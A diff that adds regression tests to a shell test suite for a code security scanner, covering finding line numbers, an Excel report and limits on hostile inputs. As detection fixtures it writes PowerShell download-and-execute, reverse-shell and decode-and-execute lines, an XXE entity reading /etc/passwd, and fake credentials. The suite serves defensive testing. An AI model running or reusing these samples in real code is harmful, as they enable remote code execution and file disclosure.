@@ -4021,6 +4021,114 @@ print('|'.join(sorted('%s=%s' % (r[2], r[col] or '') for r in rows if r[2] in ('
             skip_test "Excel Line column [$ME]" "openpyxl not installed"
         fi
     done
+    # ── second review round: each assertion below was seen failing before its fix ──────────────────────────────────────
+    MD2="${SCRATCH}/m_repo2"; rm -rf "$MD2"; mkdir -p "$MD2"/{ps,rust}
+    printf '%s\n' '$x = 1' '(New-Object System.Net.WebClient).DownloadFile("http://x.invalid/a.exe", "a.exe")' 'Write-Host hi' 'iex $y' > "$MD2/ps/dl.ps1"
+    printf '%s\n' '$c = New-Object Net.Sockets.TcpClient("10.0.0.1",4444)' '$s = $c.GetStream()' 'cmd.exe /c whoami' > "$MD2/ps/rs.ps1"
+    printf '%s\n' '[Convert]::FromBase64String($s)' 'Write-Host hi' '[ScriptBlock]::Create($y)' > "$MD2/ps/dec.ps1"
+    printf '%s\n' 'password: "hunter2hunter2"' '' '' '' 'token = "abcdefghij"' > "$MD2/rust/b.rs"      # one message, two scanners, two lines
+    for ME in bash python; do
+        m_scan "$ME" "$MD2" "m_r2_$ME"
+        # a nested OR (`A && { B || C }`) must not forget A when B does not match: the second alternative used to wipe it
+        assert_eq "2|[2, 4]|2" "$(m_get ps/dl.ps1 CWE-319:PowerShell_plaintext_download_then_run)" "lines2 [$ME]: a download over http AND a run: the lines of both tests (the first alternative of the run test is absent)"
+        assert_eq "1|[1, 2, 3]|3" "$(m_get ps/rs.ps1 CWE-78:PowerShell_reverse_shell)" "lines2 [$ME]: a socket, its stream and a shell: the lines of all three tests"
+        assert_eq "1|[1, 3]|2" "$(m_get ps/dec.ps1 CWE-95:PowerShell_decodes_and_executes)" "lines2 [$ME]: decode AND execute: both lines, whichever alternative of the execute test matched"
+        # the Excel Line column: two records with one message take one line each
+        if python3 -c "import openpyxl" 2>/dev/null; then
+            MX="${MR}/m_r2_${ME}.xlsx"
+            python3 "${ROOT_DIR}/generate_excel_report.py" "$MREP" "$MX" >/dev/null 2>&1 || true
+            MXL=$(python3 -c "
+from openpyxl import load_workbook
+ws = load_workbook('$MX')['Findings']
+head = [c.value for c in ws[1]]
+rows = [[c.value for c in r] for r in ws.iter_rows(min_row=2)]
+col = head.index('Line')
+print('|'.join(sorted('%s=%s' % (r[2], r[col] or '') for r in rows if r[2] == 'rust/b.rs' and 'CWE-798:hardcoded_credential' in r[4])))" 2>/dev/null || echo "unreadable")
+            assert_eq "rust/b.rs=1|rust/b.rs=5" "$MXL" "lines2 [$ME]: two findings of one file with the same message: the Excel rows show their own lines (1 and 5), not the first one twice"
+        else
+            skip_test "Excel two findings with one message [$ME]" "openpyxl not installed"
+        fi
+    done
+    if python3 -c "import openpyxl" 2>/dev/null; then
+        # the join between the report's records and the file_results rows: a message with trailing blanks, or with " | " in it
+        XJ=$(python3 -I - "$ROOT_DIR" <<'PY' 2>&1
+import sys
+sys.path.insert(0, sys.argv[1])
+from openpyxl import Workbook
+import generate_excel_report as g
+def rec(msg, n):
+    return {"file": "a.py", "message": msg, "line": n, "lines": [n], "line_count": 1}
+msgs = ["semgrep[x]:rule.a:line2:ERROR:trailing blank ", "use a | b here", "CWE-22:plain"]
+data = {"directory": "/d",
+        "file_results": {"/d/a.py": {"status": "FAIL", "message": "".join("[FAIL] %s | " % m for m in msgs)}},
+        "findings": [rec(msgs[0], 2), rec(msgs[1], 7), rec(msgs[2], 9)]}
+wb = Workbook(); g.build_sheet_findings(wb, data)
+ws = wb["Findings"]
+print(len(list(ws.iter_rows(min_row=2))), "|".join("%s=%s" % (r[4].value, r[3].value) for r in ws.iter_rows(min_row=2)))
+PY
+)
+        assert_contains "$XJ" "3 " "lines2: a message that holds ' | ' stays one row of the Excel Findings tab"
+        assert_contains "$XJ" "use a | b here=7" "lines2: …and keeps its line"
+        assert_contains "$XJ" "trailing blank=" "lines2: a message with trailing blanks is still found"
+        assert_contains "$XJ" "trailing blank=2" "lines2: …and keeps its line"
+    else
+        skip_test "Excel join of records and rows" "openpyxl not installed"
+    fi
+    # gitleaks: a line number is read only where the tool puts it, and both engines read the same text the same way
+    MG="${SCRATCH}/m_gl"; rm -rf "$MG"; mkdir -p "$MG/stubs" "$MG/repo"
+    printf 'x = 1\n' > "$MG/repo/leak.py"
+    printf '%s\n' '#!/bin/sh' 'if [ "$1 $2" = "detect --help" ]; then echo "  --no-banner  --redact  --log-level  --gitleaks-ignore-path  --ignore-gitleaks-allow"; exit 0; fi' \
+        'rep=""' 'while [ $# -gt 0 ]; do case "$1" in --report-path) rep="$2" ;; esac; shift; done' 'cp "'"$MG"'/rep.json" "$rep"' 'exit 1' > "$MG/stubs/gitleaks"
+    chmod +x "$MG/stubs/gitleaks"
+    for ME in bash python; do
+        python3 -c "
+import json
+json.dump([{'File': '$MG/repo/leak.py', 'StartLine': '3\n', 'RuleID': 'generic-api-key'}], open('$MG/rep.json', 'w'))"
+        MREP="${MR}/report_scan_m_gl_${ME}.json"; rm -f "$MREP"
+        (cd "$ROOT_DIR" && PATH="$MG/stubs:$PATH" TRANSIT_ENGINE="$ME" WORK_DIR="$MW" timeout 300 bash ./scan_pipeline.sh "$MG/repo" "$MR" "m_gl_${ME}" >/dev/null 2>&1) || true
+        assert_eq "None|[]|0" "$(m_get leak.py gitleaks:generic-api-key)" "lines2 [$ME]: a gitleaks line that ends in a line break is not a line (both engines read the message the same way)"
+    done
+    # numbering is bounded: it gives up and the finding keeps its file, instead of running for minutes on a hostile file
+    MZ="${SCRATCH}/m_zq"; rm -rf "$MZ"; mkdir -p "$MZ"
+    python3 -c "
+open('$MZ/a.cdxml', 'w').write('<!ENTITY a SYSTEM \"file:///etc/passwd\">\n' + '<!ENTITY ' * 60000 + '\n')"      # 540 KB of unclosed openers
+    for ME in bash python; do
+        M_T0=$SECONDS
+        MREP="${MR}/report_scan_m_zq_${ME}.json"; rm -f "$MREP"
+        (cd "$ROOT_DIR" && LM_Z_TIMEOUT_S=1 TRANSIT_ENGINE="$ME" WORK_DIR="$MW" timeout 300 bash ./scan_pipeline.sh "$MZ" "$MR" "m_zq_${ME}" >/dev/null 2>&1) || true
+        M_ELAPSED=$((SECONDS - M_T0))
+        assert_eq "None|[]|0" "$(m_get a.cdxml CWE-611:xxe_external_entity_references_a_resource)" "lines2 [$ME]: a numbering that runs past its time limit gives up: the finding stays, without a line"
+        if (( M_ELAPSED < 40 )); then ok_test "lines2 [$ME]: …in ${M_ELAPSED} s (60,000 unclosed openers took about 85 s to number)"; else fail_test "lines2 [$ME]: the numbering of a hostile file is bounded" "took ${M_ELAPSED} s"; fi
+    done
+    # a private key whose neighbourhood is more than the resolver may hold: no line, not an unbounded read
+    MK="${SCRATCH}/m_pk"; rm -rf "$MK"; mkdir -p "$MK"
+    python3 -c "
+body = 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj'
+with open('$MK/k.pem', 'w') as fh:
+    fh.write('-----BEGIN ' + 'PRIVATE KEY-----' + body + ' ' + 'y' * 6000000 + '\n')
+    for _ in range(4):
+        fh.write('z' * 6000000 + '\n')"
+    for ME in bash python; do
+        m_scan "$ME" "$MK" "m_pk_$ME"
+        assert_eq "None|[]|0" "$(m_get k.pem CWE-321:hardcoded_private_key)" "lines2 [$ME]: a key window of 30 MB is over the resolver's budget: the finding stays, without a line"
+    done
+    # memory of the known-credential numbering: bounded by the largest token, not by a batch of tokens
+    MT="${SCRATCH}/m_bt"; rm -rf "$MT"; mkdir -p "$MT"
+    python3 -c "
+t = 'github_pat_' + 'A1b2C3d4E5' * 100000
+with open('$MT/x.env', 'w') as fh:
+    for _ in range(48):
+        fh.write('PAT=' + t + '\n')"                                                                          # 48 MB, 48 tokens of 1 MB
+    for ME in bash python; do
+        M_PEAK=$(python3 -I -c "
+import os, resource, subprocess, sys
+env = dict(os.environ, TRANSIT_ENGINE='$ME', WORK_DIR='$MW')
+subprocess.run(['bash', './scan_pipeline.sh', '$MT', '$MR', 'm_bt_$ME'], cwd='$ROOT_DIR', env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
+print(resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss // 1024)" 2>/dev/null || echo 99999)
+        MREP="${MR}/report_scan_m_bt_${ME}.json"
+        assert_eq "1|[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]|48" "$(m_get x.env known_credential_format_github_fine_grained_pat)" "lines2 [$ME]: 48 tokens of 1 MB: the lines are still right"
+        if (( M_PEAK < 120 )); then ok_test "lines2 [$ME]: …and the largest process of the scan used ${M_PEAK} MB (batches of 4096 tokens held 4096 MB-sized tokens)"; else fail_test "lines2 [$ME]: numbering 1 MB tokens stays bounded" "peak ${M_PEAK} MB"; fi
+    done
     # the summary the launcher prints on a FAIL names file:line
     if command -v jq >/dev/null 2>&1; then
         run_pipeline "$MD" --quiet --no-zip --no-excel
